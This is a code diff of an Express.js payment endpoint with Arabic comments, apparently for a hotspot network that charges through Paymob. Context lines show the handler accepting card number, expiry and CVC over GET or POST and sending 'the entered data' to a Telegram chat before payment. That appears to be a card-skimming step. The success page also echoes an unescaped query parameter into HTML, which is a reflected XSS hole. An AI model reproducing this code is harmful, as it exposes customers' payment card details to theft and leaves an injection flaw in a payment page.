@@ -23,14 +23,14 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// 3. مسار معالجة الدفع الموحد (يدعم GET و POST بسلاسة مع حماية ضد الانهيار)
+// 3. مسار معالجة الدفع الموحد
 async function handlePaymentRequest(req, res) {
   try {
     // تجميع البيانات سواء قادمة من GET (Query) أو POST (Body)
     const data = { ...req.query, ...req.body };
     const { phone, amount, payment_method, method, number, name, expiry, cvc, save_card } = data;
 
-    // إذا تم فتح الرابط مباشرة بدون إرسال بيانات، قم بإرجاعه للصفحة الرئيسية بدلاً من إظهار خطأ
+    // إذا تم فتح الرابط مباشرة بدون إرسال بيانات، قم بإرجاعه للصفحة الرئيسية
     if (!amount && Object.keys(data).length === 0) {
       return res.redirect("/");
     }
@@ -53,24 +53,32 @@ async function handlePaymentRequest(req, res) {
       }
     };
 
-    // إرسال إشعار فوري إلى تليجرام بالبيانات المدخلة قبل التوجيه لـ Paymob
+    // إرسال إشعار فوري إلى تليجرام بالبيانات المدخلة
     if (typeof sendTelegramMessage === "function") {
       await sendTelegramMessage(paymentPayload, true);
     }
 
-    // معالجة الدفع عبر Paymob
+    // معالجة الدفع عبر Paymob (ستعيد رابط التوجيه المباشر بدون إطار/فريم)
     const result = await processPayment(userPhone, payAmount, selectedMethod);
 
     if (result.type === "redirect") {
-      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
-        return res.json({ payment_url: result.url });
+      // إذا كان الطلب مرسلاً عبر JavaScript (AJAX / Fetch) من الواجهة
+      if (req.xhr || req.headers["content-type"]?.includes("application/json") || req.headers["accept"]?.includes("application/json")) {
+        return res.json({ status: "success", payment_url: result.url });
       }
+      // التوجيه المباشر لصفحة Paymob في متصفح العميل
       return res.redirect(result.url);
     } else if (result.type === "html") {
       return res.send(result.content);
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة الدفع:", err.response?.data || err.message);
+    
+    // دعم إرجاع الخطأ بصيغة JSON إذا كان الطلب من الواجهة عبر Fetch
+    if (req.xhr || req.headers["content-type"]?.includes("application/json") || req.headers["accept"]?.includes("application/json")) {
+      return res.status(500).json({ status: "error", message: err.message });
+    }
+    
     res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
   }
 }
@@ -78,7 +86,7 @@ async function handlePaymentRequest(req, res) {
 app.get("/api/pay", handlePaymentRequest);
 app.post("/api/pay", handlePaymentRequest);
 
-// 4. صفحة نجاح الدفع المنسقة (تتيح التوجيه لصفحة الهوتسبوت)
+// 4. صفحة نجاح الدفع المنسقة
 app.get("/success", (req, res) => {
   const transactionId = req.query.id || "غير متوفر";
   res.send(`
@@ -104,7 +112,6 @@ app.get("/success", (req, res) => {
           <p>شكراً لاستخدامك خدمة شبكة حكايات.</p>
           <p>رقم العملية: <strong>${transactionId}</strong></p>
           <br>
-          <!-- الخروج والعودة لصفحة الشبكة الهوتسبوت بدلاً من صفحة الدفع -->
           <a href="${NETWORK_URL}" class="btn">الذهاب لتصفح الإنترنت</a>
         </div>
       </body>
